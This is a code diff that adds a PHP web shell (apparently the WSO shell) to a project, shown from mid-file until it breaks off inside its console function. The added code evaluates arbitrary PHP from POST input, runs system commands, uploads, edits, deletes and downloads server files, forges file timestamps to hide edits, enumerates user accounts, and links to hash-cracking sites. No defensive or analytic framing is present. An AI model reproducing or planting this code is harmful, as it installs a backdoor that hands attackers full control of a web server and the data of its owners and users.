+        wsoSecParam('Account Settings',wsoEx('net accounts'));
+        wsoSecParam('User Accounts',wsoEx('net user'));
+    }
+    echo '&lt;/div&gt;';
+    wsoFooter();
+}
+
+function actionPhp() {
+    if(isset($_POST['ajax'])) {
+        WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
+        ob_start();
+        eval($_POST['p1']);
+        $temp = &quot;document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='&quot; . addcslashes(htmlspecialchars(ob_get_clean()), &quot;\n\r\t\\'\0&quot;) . &quot;';\n&quot;;
+        echo strlen($temp), &quot;\n&quot;, $temp;
+        exit;
+    }
+    if(empty($_POST['ajax']) &amp;&amp; !empty($_POST['p1']))
+        WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
+
+    wsoHeader();
+    if(isset($_POST['p2']) &amp;&amp; ($_POST['p2'] == 'info')) {
+        echo '&lt;h1&gt;PHP info&lt;/h1&gt;&lt;div class=content&gt;&lt;style&gt;.p {color:#000;}&lt;/style&gt;';
+        ob_start();
+        phpinfo();
+        $tmp = ob_get_clean();
+        $tmp = preg_replace(array (
+            '!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU',
+            '!td, th {(.*)}!msiU',
+            '!&lt;img[^&gt;]+&gt;!msiU',
+        ), array (
+            '',
+            '.e, .v, .h, .h th {$1}',
+            ''
+        ), $tmp);
+        echo str_replace('&lt;h1','&lt;h2', $tmp) .'&lt;/div&gt;&lt;br&gt;';
+    }
+    echo '&lt;h1&gt;Execution PHP-code&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=pf method=post onsubmit=&quot;if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;&quot;&gt;&lt;textarea name=code class=bigarea id=PhpCode&gt;'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'&lt;/textarea&gt;&lt;input type=submit value=Eval style=&quot;margin-top:5px&quot;&gt;';
+    echo ' &lt;input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'&gt; send using AJAX&lt;/form&gt;&lt;pre id=PhpOutput style=&quot;'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;&quot; class=ml1&gt;';
+    if(!empty($_POST['p1'])) {
+        ob_start();
+        eval($_POST['p1']);
+        echo htmlspecialchars(ob_get_clean());
+    }
+    echo '&lt;/pre&gt;&lt;/div&gt;';
+    wsoFooter();
+}
+
+function actionFilesMan() {
+    if (!empty ($_COOKIE['f']))
+        $_COOKIE['f'] = @unserialize($_COOKIE['f']);
+
+    if(!empty($_POST['p1'])) {
+        switch($_POST['p1']) {
+            case 'uploadFile':
+                if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
+                    echo &quot;Can't upload file!&quot;;
+                break;
+            case 'mkdir':
+                if(!@mkdir($_POST['p2']))
+                    echo &quot;Can't create new dir&quot;;
+                break;
+            case 'delete':
+                function deleteDir($path) {
+                    $path = (substr($path,-1)=='/') ? $path:$path.'/';
+                    $dh  = opendir($path);
+                    while ( ($item = readdir($dh) ) !== false) {
+                        $item = $path.$item;
+                        if ( (basename($item) == &quot;..&quot;) || (basename($item) == &quot;.&quot;) )
+                            continue;
+                        $type = filetype($item);
+                        if ($type == &quot;dir&quot;)
+                            deleteDir($item);
+                        else
+                            @unlink($item);
+                    }
+                    closedir($dh);
+                    @rmdir($path);
+                }
+                if(is_array(@$_POST['f']))
+                    foreach($_POST['f'] as $f) {
+                        if($f == '..')
+                            continue;
+                        $f = urldecode($f);
+                        if(is_dir($f))
+                            deleteDir($f);
+                        else
+                            @unlink($f);
+                    }
+                break;
+            case 'paste':
+                if($_COOKIE['act'] == 'copy') {
+                    function copy_paste($c,$s,$d){
+                        if(is_dir($c.$s)){
+                            mkdir($d.$s);
+                            $h = @opendir($c.$s);
+                            while (($f = @readdir($h)) !== false)
+                                if (($f != &quot;.&quot;) and ($f != &quot;..&quot;))
+                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
+                        } elseif(is_file($c.$s))
+                            @copy($c.$s, $d.$s);
+                    }
+                    foreach($_COOKIE['f'] as $f)
+                        copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']);
+                } elseif($_COOKIE['act'] == 'move') {
+                    function move_paste($c,$s,$d){
+                        if(is_dir($c.$s)){
+                            mkdir($d.$s);
+                            $h = @opendir($c.$s);
+                            while (($f = @readdir($h)) !== false)
+                                if (($f != &quot;.&quot;) and ($f != &quot;..&quot;))
+                                    copy_paste($c.$s.'/',$f, $d.$s.'/');
+                        } elseif(@is_file($c.$s))
+                            @copy($c.$s, $d.$s);
+                    }
+                    foreach($_COOKIE['f'] as $f)
+                        @rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f);
+                } elseif($_COOKIE['act'] == 'zip') {
+                    if(class_exists('ZipArchive')) {
+                        $zip = new ZipArchive();
+                        if ($zip-&gt;open($_POST['p2'], 1)) {
+                            chdir($_COOKIE['c']);
+                            foreach($_COOKIE['f'] as $f) {
+                                if($f == '..')
+                                    continue;
+                                if(@is_file($_COOKIE['c'].$f))
+                                    $zip-&gt;addFile($_COOKIE['c'].$f, $f);
+                                elseif(@is_dir($_COOKIE['c'].$f)) {
+                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/', FilesystemIterator::SKIP_DOTS));
+                                    foreach ($iterator as $key=&gt;$value) {
+                                        $zip-&gt;addFile(realpath($key), $key);
+                                    }
+                                }
+                            }
+                            chdir($GLOBALS['cwd']);
+                            $zip-&gt;close();
+                        }
+                    }
+                } elseif($_COOKIE['act'] == 'unzip') {
+                    if(class_exists('ZipArchive')) {
+                        $zip = new ZipArchive();
+                        foreach($_COOKIE['f'] as $f) {
+                            if($zip-&gt;open($_COOKIE['c'].$f)) {
+                                $zip-&gt;extractTo($GLOBALS['cwd']);
+                                $zip-&gt;close();
+                            }
+                        }
+                    }
+                } elseif($_COOKIE['act'] == 'tar') {
+                    chdir($_COOKIE['c']);
+                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
+                    wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
+                    chdir($GLOBALS['cwd']);
+                }
+                unset($_COOKIE['f']);
+                setcookie('f', '', time() - 3600);
+                break;
+            default:
+                if(!empty($_POST['p1'])) {
+                    WSOsetcookie('act', $_POST['p1']);
+                    WSOsetcookie('f', serialize(@$_POST['f']));
+                    WSOsetcookie('c', @$_POST['c']);
+                }
+                break;
+        }
+    }
+    wsoHeader();
+    echo '&lt;h1&gt;File manager&lt;/h1&gt;&lt;div class=content&gt;&lt;script&gt;p1_=p2_=p3_=&quot;&quot;;&lt;/script&gt;';
+    $dirContent = wsoScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
+    if($dirContent === false) { echo 'Can\'t open this folder!';wsoFooter(); return; }
+    global $sort;
+    $sort = array('name', 1);
+    if(!empty($_POST['p1'])) {
+        if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
+            $sort = array($match[1], (int)$match[2]);
+    }
+echo &quot;&lt;script&gt;
+    function sa() {
+        for(i=0;i&lt;d.files.elements.length;i++)
+            if(d.files.elements[i].type == 'checkbox')
+                d.files.elements[i].checked = d.files.elements[0].checked;
+    }
+&lt;/script&gt;
+&lt;table width='100%' class='main' cellspacing='0' cellpadding='2'&gt;
+&lt;form name=files method=post&gt;&lt;tr&gt;&lt;th width='13px'&gt;&lt;input type=checkbox onclick='sa()' class=chkbx&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\&quot;FilesMan\&quot;,null,\&quot;s_name_&quot;.($sort[1]?0:1).&quot;\&quot;)'&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\&quot;FilesMan\&quot;,null,\&quot;s_size_&quot;.($sort[1]?0:1).&quot;\&quot;)'&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\&quot;FilesMan\&quot;,null,\&quot;s_modify_&quot;.($sort[1]?0:1).&quot;\&quot;)'&gt;Modify&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Owner/Group&lt;/th&gt;&lt;th&gt;&lt;a href='#' onclick='g(\&quot;FilesMan\&quot;,null,\&quot;s_perms_&quot;.($sort[1]?0:1).&quot;\&quot;)'&gt;Permissions&lt;/a&gt;&lt;/th&gt;&lt;th&gt;Actions&lt;/th&gt;&lt;/tr&gt;&quot;;
+    $dirs = $files = array();
+    $n = count($dirContent);
+    for($i=0;$i&lt;$n;$i++) {
+        $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
+        $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
+        $tmp = array('name' =&gt; $dirContent[$i],
+                     'path' =&gt; $GLOBALS['cwd'].$dirContent[$i],
+                     'modify' =&gt; date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
+                     'perms' =&gt; wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
+                     'size' =&gt; @filesize($GLOBALS['cwd'].$dirContent[$i]),
+                     'owner' =&gt; $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
+                     'group' =&gt; $gr['name']?$gr['name']:@filegroup($dirContent[$i])
+                    );
+        if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
+            $files[] = array_merge($tmp, array('type' =&gt; 'file'));
+        elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
+            $dirs[] = array_merge($tmp, array('type' =&gt; 'link', 'link' =&gt; readlink($tmp['path'])));
+        elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i]))
+            $dirs[] = array_merge($tmp, array('type' =&gt; 'dir'));
+    }
+    $GLOBALS['sort'] = $sort;
+    function wsoCmp($a, $b) {
+        if($GLOBALS['sort'][0] != 'size')
+            return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
+        else
+            return (($a['size'] &lt; $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
+    }
+    usort($files, &quot;wsoCmp&quot;);
+    usort($dirs, &quot;wsoCmp&quot;);
+    $files = array_merge($dirs, $files);
+    $l = 0;
+    foreach($files as $f) {
+        echo '&lt;tr'.($l?' class=l1':'').'&gt;&lt;td&gt;&lt;input type=checkbox name=&quot;f[]&quot; value=&quot;'.urlencode($f['name']).'&quot; class=chkbx&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick=&quot;'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')&quot;&gt;'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');&quot; ' . (empty ($f['link']) ? '' : &quot;title='{$f['link']}'&quot;) . '&gt;&lt;b&gt;[ ' . htmlspecialchars($f['name']) . ' ]&lt;/b&gt;').'&lt;/a&gt;&lt;/td&gt;&lt;td&gt;'.(($f['type']=='file')?wsoViewSize($f['size']):$f['type']).'&lt;/td&gt;&lt;td&gt;'.$f['modify'].'&lt;/td&gt;&lt;td&gt;'.$f['owner'].'/'.$f['group'].'&lt;/td&gt;&lt;td&gt;&lt;a href=# onclick=&quot;g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')&quot;&gt;'.$f['perms']
+            .'&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;#&quot; onclick=&quot;g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')&quot;&gt;R&lt;/a&gt; &lt;a href=&quot;#&quot; onclick=&quot;g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')&quot;&gt;T&lt;/a&gt;'.(($f['type']=='file')?' &lt;a href=&quot;#&quot; onclick=&quot;g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')&quot;&gt;E&lt;/a&gt; &lt;a href=&quot;#&quot; onclick=&quot;g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')&quot;&gt;D&lt;/a&gt;':'').'&lt;/td&gt;&lt;/tr&gt;';
+        $l = $l?0:1;
+    }
+    echo &quot;&lt;tr&gt;&lt;td colspan=7&gt;
+    &lt;input type=hidden name=a value='FilesMan'&gt;
+    &lt;input type=hidden name=c value='&quot; . htmlspecialchars($GLOBALS['cwd']) .&quot;'&gt;
+    &lt;input type=hidden name=charset value='&quot;. (isset($_POST['charset'])?$_POST['charset']:'').&quot;'&gt;
+    &lt;select name='p1'&gt;&lt;option value='copy'&gt;Copy&lt;/option&gt;&lt;option value='move'&gt;Move&lt;/option&gt;&lt;option value='delete'&gt;Delete&lt;/option&gt;&quot;;
+    if(class_exists('ZipArchive'))
+        echo &quot;&lt;option value='zip'&gt;Compress (zip)&lt;/option&gt;&lt;option value='unzip'&gt;Uncompress (zip)&lt;/option&gt;&quot;;
+    echo &quot;&lt;option value='tar'&gt;Compress (tar.gz)&lt;/option&gt;&quot;;
+    if(!empty($_COOKIE['act']) &amp;&amp; @count($_COOKIE['f']))
+        echo &quot;&lt;option value='paste'&gt;Paste / Compress&lt;/option&gt;&quot;;
+    echo &quot;&lt;/select&gt;&amp;nbsp;&quot;;
+    if(!empty($_COOKIE['act']) &amp;&amp; @count($_COOKIE['f']) &amp;&amp; (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
+        echo &quot;file name: &lt;input type=text name=p2 value='wso_&quot; . date(&quot;Ymd_His&quot;) . &quot;.&quot; . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . &quot;'&gt;&amp;nbsp;&quot;;
+    echo &quot;&lt;input type='submit' value='&gt;&gt;'&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/div&gt;&quot;;
+    wsoFooter();
+}
+
+function actionStringTools() {
+    if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
+    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
+    if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i&lt;strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
+    if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i&lt;strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
+    if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i&lt;strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
+    $stringTools = array(
+        'Base64 encode' =&gt; 'base64_encode',
+        'Base64 decode' =&gt; 'base64_decode',
+        'Url encode' =&gt; 'urlencode',
+        'Url decode' =&gt; 'urldecode',
+        'Full urlencode' =&gt; 'full_urlencode',
+        'md5 hash' =&gt; 'md5',
+        'sha1 hash' =&gt; 'sha1',
+        'crypt' =&gt; 'crypt',
+        'CRC32' =&gt; 'crc32',
+        'ASCII to HEX' =&gt; 'ascii2hex',
+        'HEX to ASCII' =&gt; 'hex2ascii',
+        'HEX to DEC' =&gt; 'hexdec',
+        'HEX to BIN' =&gt; 'hex2bin',
+        'DEC to HEX' =&gt; 'dechex',
+        'DEC to BIN' =&gt; 'decbin',
+        'BIN to HEX' =&gt; 'binhex',
+        'BIN to DEC' =&gt; 'bindec',
+        'String to lower case' =&gt; 'strtolower',
+        'String to upper case' =&gt; 'strtoupper',
+        'Htmlspecialchars' =&gt; 'htmlspecialchars',
+        'String length' =&gt; 'strlen',
+    );
+    if(isset($_POST['ajax'])) {
+        WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true);
+        ob_start();
+        if(in_array($_POST['p1'], $stringTools))
+            echo $_POST['p1']($_POST['p2']);
+        $temp = &quot;document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='&quot;.addcslashes(htmlspecialchars(ob_get_clean()),&quot;\n\r\t\\'\0&quot;).&quot;';\n&quot;;
+        echo strlen($temp), &quot;\n&quot;, $temp;
+        exit;
+    }
+    if(empty($_POST['ajax'])&amp;&amp;!empty($_POST['p1']))
+        WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0);
+    wsoHeader();
+    echo '&lt;h1&gt;String conversions&lt;/h1&gt;&lt;div class=content&gt;';
+    echo &quot;&lt;form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'&gt;&lt;select name='selectTool'&gt;&quot;;
+    foreach($stringTools as $k =&gt; $v)
+        echo &quot;&lt;option value='&quot;.htmlspecialchars($v).&quot;'&gt;&quot;.$k.&quot;&lt;/option&gt;&quot;;
+        echo &quot;&lt;/select&gt;&lt;input type='submit' value='&gt;&gt;'/&gt; &lt;input type=checkbox name=ajax value=1 &quot;.(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').&quot;&gt; send using AJAX&lt;br&gt;&lt;textarea name='input' style='margin-top:5px' class=bigarea&gt;&quot;.(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2'])).&quot;&lt;/textarea&gt;&lt;/form&gt;&lt;pre class='ml1' style='&quot;.(empty($_POST['p1'])?'display:none;':'').&quot;margin-top:5px' id='strOutput'&gt;&quot;;
+    if(!empty($_POST['p1'])) {
+        if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
+    }
+    echo&quot;&lt;/pre&gt;&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search files:&lt;/h1&gt;&lt;div class=content&gt;
+        &lt;form onsubmit=\&quot;g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\&quot;&gt;&lt;table cellpadding='1' cellspacing='0' width='50%'&gt;
+            &lt;tr&gt;&lt;td width='1%'&gt;Text:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='text' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt;
+            &lt;tr&gt;&lt;td&gt;Path:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='cwd' value='&quot;. htmlspecialchars($GLOBALS['cwd']) .&quot;' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt;
+            &lt;tr&gt;&lt;td&gt;Name:&lt;/td&gt;&lt;td&gt;&lt;input type='text' name='filename' value='*' style='width:100%'&gt;&lt;/td&gt;&lt;/tr&gt;
+            &lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type='submit' value='&gt;&gt;'&gt;&lt;/td&gt;&lt;/tr&gt;
+            &lt;/table&gt;&lt;/form&gt;&quot;;
+
+    function wsoRecursiveGlob($path) {
+        if(substr($path, -1) != '/')
+            $path.='/';
+        $paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
+        if(is_array($paths)&amp;&amp;@count($paths)) {
+            foreach($paths as $item) {
+                if(@is_dir($item)){
+                    if($path!=$item)
+                        wsoRecursiveGlob($item);
+                } else {
+                    if(empty($_POST['p2']) || @strpos(file_get_contents($item), $_POST['p2'])!==false)
+                        echo &quot;&lt;a href='#' onclick='g(\&quot;FilesTools\&quot;,null,\&quot;&quot;.urlencode($item).&quot;\&quot;, \&quot;view\&quot;,\&quot;\&quot;)'&gt;&quot;.htmlspecialchars($item).&quot;&lt;/a&gt;&lt;br&gt;&quot;;
+                }
+            }
+        }
+    }
+    if(@$_POST['p3'])
+        wsoRecursiveGlob($_POST['c']);
+    echo &quot;&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search for hash:&lt;/h1&gt;&lt;div class=content&gt;
+        &lt;form method='post' target='_blank' name='hf'&gt;
+            &lt;input type='text' name='hash' style='width:200px;'&gt;&lt;br&gt;
+            &lt;input type='hidden' name='act' value='find'/&gt;
+            &lt;input type='button' value='hashcracking.ru' onclick=\&quot;document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\&quot;&gt;&lt;br&gt;
+            &lt;input type='button' value='md5.rednoize.com' onclick=\&quot;document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&amp;s=md5';document.hf.submit()\&quot;&gt;&lt;br&gt;
+            &lt;input type='button' value='crackfor.me' onclick=\&quot;document.hf.action='http://crackfor.me/index.php';document.hf.submit()\&quot;&gt;&lt;br&gt;
+        &lt;/form&gt;&lt;/div&gt;&quot;;
+    wsoFooter();
+}
+
+function actionFilesTools() {
+    if( isset($_POST['p1']) )
+        $_POST['p1'] = urldecode($_POST['p1']);
+    if(@$_POST['p2']=='download') {
+        if(@is_file($_POST['p1']) &amp;&amp; @is_readable($_POST['p1'])) {
+            ob_start(&quot;ob_gzhandler&quot;, 4096);
+            header(&quot;Content-Disposition: attachment; filename=&quot;.basename($_POST['p1']));
+            if (function_exists(&quot;mime_content_type&quot;)) {
+                $type = @mime_content_type($_POST['p1']);
+                header(&quot;Content-Type: &quot; . $type);
+            } else
+                header(&quot;Content-Type: application/octet-stream&quot;);
+            $fp = @fopen($_POST['p1'], &quot;r&quot;);
+            if($fp) {
+                while(!@feof($fp))
+                    echo @fread($fp, 1024);
+                fclose($fp);
+            }
+        }exit;
+    }
+    if( @$_POST['p2'] == 'mkfile' ) {
+        if(!file_exists($_POST['p1'])) {
+            $fp = @fopen($_POST['p1'], 'w');
+            if($fp) {
+                $_POST['p2'] = &quot;edit&quot;;
+                fclose($fp);
+            }
+        }
+    }
+    wsoHeader();
+    echo '&lt;h1&gt;File tools&lt;/h1&gt;&lt;div class=content&gt;';
+    if( !file_exists(@$_POST['p1']) ) {
+        echo 'File not exists';
+        wsoFooter();
+        return;
+    }
+    $uid = @posix_getpwuid(@fileowner($_POST['p1']));
+    if(!$uid) {
+        $uid['name'] = @fileowner($_POST['p1']);
+        $gid['name'] = @filegroup($_POST['p1']);
+    } else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
+    echo '&lt;span&gt;Name:&lt;/span&gt; '.htmlspecialchars(@basename($_POST['p1'])).' &lt;span&gt;Size:&lt;/span&gt; '.(is_file($_POST['p1'])?wsoViewSize(filesize($_POST['p1'])):'-').' &lt;span&gt;Permission:&lt;/span&gt; '.wsoPermsColor($_POST['p1']).' &lt;span&gt;Owner/Group:&lt;/span&gt; '.$uid['name'].'/'.$gid['name'].'&lt;br&gt;';
+    echo '&lt;span&gt;Change time:&lt;/span&gt; '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' &lt;span&gt;Access time:&lt;/span&gt; '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' &lt;span&gt;Modify time:&lt;/span&gt; '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'&lt;br&gt;&lt;br&gt;';
+    if( empty($_POST['p2']) )
+        $_POST['p2'] = 'view';
+    if( is_file($_POST['p1']) )
+        $m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
+    else
+        $m = array('Chmod', 'Rename', 'Touch');
+    foreach($m as $v)
+        echo '&lt;a href=# onclick=&quot;g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')&quot;&gt;'.((strtolower($v)==@$_POST['p2'])?'&lt;b&gt;[ '.$v.' ]&lt;/b&gt;':$v).'&lt;/a&gt; ';
+    echo '&lt;br&gt;&lt;br&gt;';
+    switch($_POST['p2']) {
+        case 'view':
+            echo '&lt;pre class=ml1&gt;';
+            $fp = @fopen($_POST['p1'], 'r');
+            if($fp) {
+                while( !@feof($fp) )
+                    echo htmlspecialchars(@fread($fp, 1024));
+                @fclose($fp);
+            }
+            echo '&lt;/pre&gt;';
+            break;
+        case 'highlight':
+            if( @is_readable($_POST['p1']) ) {
+                echo '&lt;div class=ml1 style=&quot;background-color: #e1e1e1;color:black;&quot;&gt;';
+                $code = @highlight_file($_POST['p1'],true);
+                echo str_replace(array('&lt;span ','&lt;/span&gt;'), array('&lt;font ','&lt;/font&gt;'),$code).'&lt;/div&gt;';
+            }
+            break;
+        case 'chmod':
+            if( !empty($_POST['p3']) ) {
+                $perms = 0;
+                for($i=strlen($_POST['p3'])-1;$i&gt;=0;--$i)
+                    $perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
+                if(!@chmod($_POST['p1'], $perms))
+                    echo 'Can\'t set permissions!&lt;br&gt;&lt;script&gt;document.mf.p3.value=&quot;&quot;;&lt;/script&gt;';
+            }
+            clearstatcache();
+            echo '&lt;script&gt;p3_=&quot;&quot;;&lt;/script&gt;&lt;form onsubmit=&quot;g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;&quot;&gt;&lt;input type=text name=chmod value=&quot;'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;';
+            break;
+        case 'edit':
+            if( !is_writable($_POST['p1'])) {
+                echo 'File isn\'t writeable';
+                break;
+            }
+            if( !empty($_POST['p3']) ) {
+                $time = @filemtime($_POST['p1']);
+                $_POST['p3'] = substr($_POST['p3'],1);
+                $fp = @fopen($_POST['p1'],&quot;w&quot;);
+                if($fp) {
+                    @fwrite($fp,$_POST['p3']);
+                    @fclose($fp);
+                    echo 'Saved!&lt;br&gt;&lt;script&gt;p3_=&quot;&quot;;&lt;/script&gt;';
+                    @touch($_POST['p1'],$time,$time);
+                }
+            }
+            echo '&lt;form onsubmit=&quot;g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;&quot;&gt;&lt;textarea name=text class=bigarea&gt;';
+            $fp = @fopen($_POST['p1'], 'r');
+            if($fp) {
+                while( !@feof($fp) )
+                    echo htmlspecialchars(@fread($fp, 1024));
+                @fclose($fp);
+            }
+            echo '&lt;/textarea&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;';
+            break;
+        case 'hexdump':
+            $c = @file_get_contents($_POST['p1']);
+            $n = 0;
+            $h = array('00000000&lt;br&gt;','','');
+            $len = strlen($c);
+            for ($i=0; $i&lt;$len; ++$i) {
+                $h[1] .= sprintf('%02X',ord($c[$i])).' ';
+                switch ( ord($c[$i]) ) {
+                    case 0:  $h[2] .= ' '; break;
+                    case 9:  $h[2] .= ' '; break;
+                    case 10: $h[2] .= ' '; break;
+                    case 13: $h[2] .= ' '; break;
+                    default: $h[2] .= $c[$i]; break;
+                }
+                $n++;
+                if ($n == 32) {
+                    $n = 0;
+                    if ($i+1 &lt; $len) {$h[0] .= sprintf('%08X',$i+1).'&lt;br&gt;';}
+                    $h[1] .= '&lt;br&gt;';
+                    $h[2] .= &quot;\n&quot;;
+                }
+            }
+            echo '&lt;table cellspacing=1 cellpadding=5 bgcolor=#222222&gt;&lt;tr&gt;&lt;td bgcolor=#333333&gt;&lt;span style=&quot;font-weight: normal;&quot;&gt;&lt;pre&gt;'.$h[0].'&lt;/pre&gt;&lt;/span&gt;&lt;/td&gt;&lt;td bgcolor=#282828&gt;&lt;pre&gt;'.$h[1].'&lt;/pre&gt;&lt;/td&gt;&lt;td bgcolor=#333333&gt;&lt;pre&gt;'.htmlspecialchars($h[2]).'&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
+            break;
+        case 'rename':
+            if( !empty($_POST['p3']) ) {
+                if(!@rename($_POST['p1'], $_POST['p3']))
+                    echo 'Can\'t rename!&lt;br&gt;';
+                else
+                    die('&lt;script&gt;g(null,null,&quot;'.urlencode($_POST['p3']).'&quot;,null,&quot;&quot;)&lt;/script&gt;');
+            }
+            echo '&lt;form onsubmit=&quot;g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;&quot;&gt;&lt;input type=text name=name value=&quot;'.htmlspecialchars($_POST['p1']).'&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;';
+            break;
+        case 'touch':
+            if( !empty($_POST['p3']) ) {
+                $time = strtotime($_POST['p3']);
+                if($time) {
+                    if(!touch($_POST['p1'],$time,$time))
+                        echo 'Fail!';
+                    else
+                        echo 'Touched!';
+                } else echo 'Bad time format!';
+            }
+            clearstatcache();
+            echo '&lt;script&gt;p3_=&quot;&quot;;&lt;/script&gt;&lt;form onsubmit=&quot;g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;&quot;&gt;&lt;input type=text name=touch value=&quot;'.date(&quot;Y-m-d H:i:s&quot;, @filemtime($_POST['p1'])).'&quot;&gt;&lt;input type=submit value=&quot;&gt;&gt;&quot;&gt;&lt;/form&gt;';
+            break;
+    }
+    echo '&lt;/div&gt;';
+    wsoFooter();
+}
+
+function actionConsole() {
+    if(!empty($_POST['p1']) &amp;&amp; !empty($_POST['p2'])) {
+        WSOsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', true);
+        $_POST['p1'] .= ' 2&gt;&amp;1';
+    } elseif(!empty($_POST['p1']))
+        WSOsetcookie(md5($_SERVER['HTTP_HOST']).'stderr_to_out', 0);
+
+    if(isset($_POST['ajax'])) {
+        WSOsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true);
+        ob_start();
+        echo &quot;d.cf.cmd.value='';\n&quot;;
+        $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes(&quot;\n$ &quot;.$_POST['p1'].&quot;\n&quot;.wsoEx($_POST['p1']),&quot;\n\r\t\\'\0&quot;));
+        if(preg_match(&quot;!.*cd\s+([^;]+)$!&quot;,$_POST['p1'],$match)) {
+            if(@chdir($match[1])) {
+                $GLOBALS['cwd'] = @getcwd();
+                echo &quot;c_='&quot;.$GLOBALS['cwd'].&quot;';&quot;;
